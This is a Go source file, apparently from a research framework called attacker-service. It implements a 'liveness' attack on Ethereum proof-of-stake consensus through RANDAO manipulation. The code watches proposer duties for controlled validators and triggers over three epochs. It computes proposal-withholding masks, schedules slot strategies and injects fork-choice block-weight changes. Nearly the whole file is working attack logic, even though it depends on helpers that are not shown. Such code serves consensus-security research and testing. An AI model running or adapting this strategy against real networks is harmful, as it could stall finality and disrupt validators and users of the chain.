package liveness

import (
	"context"
	"encoding/json"
	"errors"
	"github.com/google/uuid"
	golru "github.com/hashicorp/golang-lru"
	"github.com/prysmaticlabs/prysm/v5/cache/lru"
	"github.com/prysmaticlabs/prysm/v5/consensus-types/primitives"
	log "github.com/sirupsen/logrus"
	"github.com/tsinghua-cel/attacker-service/common"
	"github.com/tsinghua-cel/attacker-service/types"
	"strconv"
	"time"
)

type Instance struct {
	b                 types.ServiceBackend
	param             types.LibraryParams
	triggerOffset     int64
	epochDutyCache    *golru.Cache
	bestMaskDutyCache *golru.Cache
	modifiedSlotRoot  string
}

func (o *Instance) Name() string {
	return "liveness"
}

func (o *Instance) Description() string {
	// implement attack https://ethresear.ch/t/liveness-attack-in-ethereum-pos-protocol-using-randao-manipulation/22241
	desc_eng := `liveness attack.`
	return desc_eng
}

func toInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 999999
	}
	return i
}

func (o *Instance) Run(ctx context.Context, params types.LibraryParams, feedbacker types.FeedBacker) {
	olog := log.WithField("name", o.Name())
	olog.Info("start to run strategy")
	attacker := params.Attacker
	o.b = attacker.GetBackend()
	o.param = params
	o.epochDutyCache = lru.New(10)
	o.bestMaskDutyCache = lru.New(10)
	o.b.SetStrategyCaller(o.ModifyBlockWeightCaller)

	t := time.NewTicker(time.Second)
	defer t.Stop()

	history := make(map[int]bool)
	var getCacheDuty = func(epoch int64) (duties []types.ProposerDuty) {
		return nil
		//if d, exist := epochDutyCache.Get(epoch); exist {
		//	return d.([]types.ProposerDuty)
		//} else {
		//	return nil
		//}
	}
	var setCacheDuty = func(epoch int64, duties []types.ProposerDuty) {
		o.epochDutyCache.Add(epoch, duties)
	}

	triggerring := false
	triggeredEpoch := 0 // record the epoch that strategy is triggered.
	for {
		select {
		case <-ctx.Done():
			log.WithField("name", o.Name()).Info("stop to run strategy")
			return
		case <-t.C:
			// 如果当前epoch的第一个slot是attacker, 并且下一个epoch 的第一个slot是attacker,
			// 那么当前epoch 为 epoch 1， 后续一共三个epoch.
			// 当前epoch的第一个slot delay 8s.
			state, err := o.b.GetBeaconState("head")
			if err != nil {
				olog.WithField("error", err).Error("failed to get beacon state")
				continue
			}
			slot, _ := state.Slot()
			epoch := common.SlotToEpoch(int64(slot))
			if history[int(epoch)] == true {
				continue
			}
			nextEpoch := epoch + 1

			var curDuty = getCacheDuty(epoch)
			var nextDuty = getCacheDuty(nextEpoch)
			if curDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(epoch); err != nil {
					continue
				} else {
					setCacheDuty(epoch, duty)
					curDuty = duty
				}
			}
			if nextDuty == nil {
				if duty, err := attacker.GetEpochDutiesFromAttack(nextEpoch); err != nil {
					continue
				} else {
					setCacheDuty(nextEpoch, duty)
					nextDuty = duty
				}
			}
			o.dumpDuties(epoch, curDuty)
			o.dumpDuties(nextEpoch, nextDuty)

			for {
				if !triggerring {
					// generate a simple strategy for nextDuty first.
					slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
					strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
					if err = attacker.UpdateStrategy(strategy); err != nil {
						olog.WithField("error", err).Error("failed to update strategy simple")
					} else {
						olog.WithFields(log.Fields{
							"epoch":    nextEpoch,
							"strategy": strategy,
						}).Debug("update strategy successfully")
					}

					if params.IsHackValidator(toInt(nextDuty[0].ValidatorIndex)) && params.IsHackValidator(toInt(curDuty[0].ValidatorIndex)) &&
						o.attackerInTailN(params.FilterHackerDuties(curDuty), 9) && epoch > 3 {
						triggerring = true
						triggeredEpoch = int(epoch)
						olog.WithFields(log.Fields{
							"current epoch": epoch,
							"next epoch":    epoch + 1,
						}).Debug("strategy trigger")
						continue
					}

					history[int(epoch)] = true
					break

				} else {
					o.triggerOffset = epoch - int64(triggeredEpoch) + 1
					if o.triggerOffset == 1 {
						{
							// update current epoch strategy.
							olog.WithFields(log.Fields{
								"epoch":        epoch,
								"len(curduty)": len(curDuty),
							}).Debug("before ComputeBestMaskDuty")
							// compute bestMaskDuty and update current epoch strategy.
							bestMask, err := o.ComputeBestMask(uint64(slot), curDuty, AttackerCountCmper{})
							if err != nil {
								olog.WithField("error", err).WithField("offset", o.triggerOffset).Error("failed to compute best mask duty")
							} else {
								olog.WithFields(log.Fields{
									"masked": bestMask.maskedDuties,
								}).Debug("after ComputeBestMaskDuty")
								o.setEpochBestMaskDuty(epoch, bestMask)
							}

							slotsStrategies := genStrategyForTrigger1(int(epoch), params.FilterHackerDuties(curDuty), bestMask)
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   1,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// generate next epoch strategy without bestMaskDuty.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(nextEpoch), params.FilterHackerDuties(nextDuty), BestMaskDutyInfo{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break
					} else if o.triggerOffset == 2 {
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("before ComputeBestMaskDuty")
						// compute bestMaskDuty and update current epoch strategy.
						bestMask, err := o.ComputeBestMask(uint64(slot), curDuty, AttackerCountAndFirstAttackerCmper{})
						if err != nil {
							olog.WithField("error", err).Error("failed to compute best mask duty")
							break
						} else {
							olog.WithFields(log.Fields{
								"masked": bestMask.maskedDuties,
							}).Debug("after ComputeBestMaskDuty")
							o.setEpochBestMaskDuty(epoch, bestMask)
						}
						{
							// update current epoch strategy.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger2(int(epoch), params.FilterHackerDuties(curDuty), bestMask)
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   2,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// generate next epoch strategy without bestMaskDuty.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger3(int(nextEpoch), params.FilterHackerDuties(nextDuty), BestMaskDutyInfo{})
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("pre update triggering strategy successfully")
							}
						}
						history[int(epoch)] = true
						break
					} else if o.triggerOffset == 3 {
						olog.WithFields(log.Fields{
							"epoch":        epoch,
							"len(curduty)": len(curDuty),
						}).Debug("before ComputeBestMaskDuty")
						// compute bestMaskDuty and update current epoch strategy.
						bestMask, err := o.ComputeBestMask(uint64(slot), curDuty, AttackerCountAndFirstAttackerCmper{})
						if err != nil {
							olog.WithField("error", err).Error("failed to compute best mask duty")
							break
						} else {
							olog.WithFields(log.Fields{
								"masked": bestMask.maskedDuties,
							}).Debug("after ComputeBestMaskDuty")
							o.setEpochBestMaskDuty(epoch, bestMask)
						}
						{
							// update current epoch strategy.
							strategy := types.Strategy{}
							strategy.Uid = uuid.NewString()
							strategy.Slots = genStrategyForTrigger3(int(epoch), params.FilterHackerDuties(curDuty), bestMask)
							strategy.Category = o.Name()
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update triggering strategy")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    epoch,
									"strategy": strategy,
									"trigger":  triggerring,
									"offset":   3,
								}).Debug("update triggering strategy successfully")
							}
						}
						{
							// set triggering to false
							triggerring = false
							// generate a simple strategy for nextDuty first.
							slotsStrategies := genSimpleStrategy(int(nextEpoch), params.FilterHackerDuties(nextDuty))
							strategy := types.NewStrategy(o.Name(), slotsStrategies, []types.ValidatorStrategy{})
							if err = attacker.UpdateStrategy(strategy); err != nil {
								olog.WithField("error", err).Error("failed to update strategy simple")
							} else {
								olog.WithFields(log.Fields{
									"epoch":    nextEpoch,
									"strategy": strategy,
								}).Debug("update strategy successfully")
							}
						}
						history[int(epoch)] = true
						break
					}
				}
			}
		}
	}
}

func (o *Instance) ModifyBlockWeightCaller(method string, params ...interface{}) (string, error) {
	type ModifyBlockRootAndWeight struct {
		SlotRoot string `json:"slot_root"`
		Weight   int64  `json:"weight"`
	}
	var err error
	olog := log.WithField("name", o.Name()).WithField("function", "ModifyBlockWeightCaller").WithField("triggerOffset", o.triggerOffset)

	if o.triggerOffset == 1 {
		curSlot := common.GetCurrentSlot()
		olog.Debug("current slot is ", curSlot)
		if o.modifiedSlotRoot == "" {
			curEpoch := common.SlotToEpoch(curSlot)
			bestMask, exist := o.getEpochBestMaskDuty(curEpoch)
			if !exist {
				olog.Debug("epoch best mask duty not exist.")
				return "", errors.New("not found best mask duty for current epoch")
			}
			var targetSlot string
			for idx, duty := range bestMask.attackerDuties {
				if idx > 0 && bestMask.order[idx] == 0 {
					targetSlot = duty.Slot
					break
				}
			}
			olog.WithField("target_slot", targetSlot).Debug("find target slot in attackerDuties.")
			if targetSlot == "" {
				return "", errors.New("not found valid target slot for attack")
			}
			if int(curSlot) < toInt(targetSlot) {
				return "", nil
			}
			root, exist := o.b.GetCacheSlotRoot(curSlot)
			if !exist {
				root, err = o.b.GetSlotRoot(int64(toInt(targetSlot)))
				if err != nil {
					olog.WithError(err).WithField("target_slot", targetSlot).Debug("get slot block root failed.")
				}
			}

			o.modifiedSlotRoot = root
			modify := ModifyBlockRootAndWeight{
				SlotRoot: root,
				Weight:   100,
			}
			res, _ := json.Marshal(modify)
			olog.WithField("target_slot", targetSlot).WithField("response", res).Debug("marshal response")
			return string(res), nil
		} else {
			epoch := common.SlotToEpoch(curSlot)
			epochEnd := common.EpochEnd(epoch)
			olog.WithFields(log.Fields{
				"current_slot": curSlot,
				"epoch":        epoch,
				"epoch_end":    epochEnd,
				"modifiedRoot": o.modifiedSlotRoot,
			}).Debug("dump info for modify block weight")
			if curSlot == epochEnd {
				modify := ModifyBlockRootAndWeight{
					SlotRoot: o.modifiedSlotRoot,
					Weight:   -100,
				}
				res, _ := json.Marshal(modify)

				o.modifiedSlotRoot = ""
				olog.WithFields(log.Fields{
					"current_slot": curSlot,
					"epoch":        epoch,
					"epoch_end":    epochEnd,
					"modifiedRoot": o.modifiedSlotRoot,
					"response":     string(res),
				}).Debug("goto rollback block weight")
				return string(res), nil
			}
		}
	}
	return "", nil
}

type BestMaskDutyInfo struct {
	FirstIsAttack  bool
	AttackersCount int
	maskedDuties   []types.ProposerDuty
	attackerDuties []types.ProposerDuty
	order          []int
	proposers      []primitives.ValidatorIndex
	seed           []byte
}

func (o *Instance) attackerCount(vals []primitives.ValidatorIndex) int {
	var count = 0
	for i := 0; i < len(vals); i++ {
		if o.param.IsHackValidator(int(vals[i])) {
			count++
		}
	}
	return count
}

func (o *Instance) attackerInTailN(attackDuties []types.ProposerDuty, tailN int) bool {
	latest := attackDuties[len(attackDuties)-1]
	slot := toInt(latest.Slot)
	epoch := common.SlotToEpoch(int64(slot))
	epochEnd := common.EpochEnd(epoch)
	return (int(epochEnd) - tailN) <= slot
}

func (s *Instance) dumpDuties(epoch int64, duties []types.ProposerDuty) {
	for _, duty := range duties {
		log.WithFields(log.Fields{
			"epoch":     epoch,
			"slot":      duty.Slot,
			"validator": duty.ValidatorIndex,
		}).Debug("epoch duty")
	}
}

func (s *Instance) setEpochBestMaskDuty(epoch int64, bestMask BestMaskDutyInfo) {
	s.bestMaskDutyCache.Add(epoch, bestMask)
}
func (s *Instance) getEpochBestMaskDuty(epoch int64) (BestMaskDutyInfo, bool) {
	if b, exist := s.bestMaskDutyCache.Get(epoch); exist {
		return b.(BestMaskDutyInfo), true
	} else {
		return BestMaskDutyInfo{}, false
	}
}
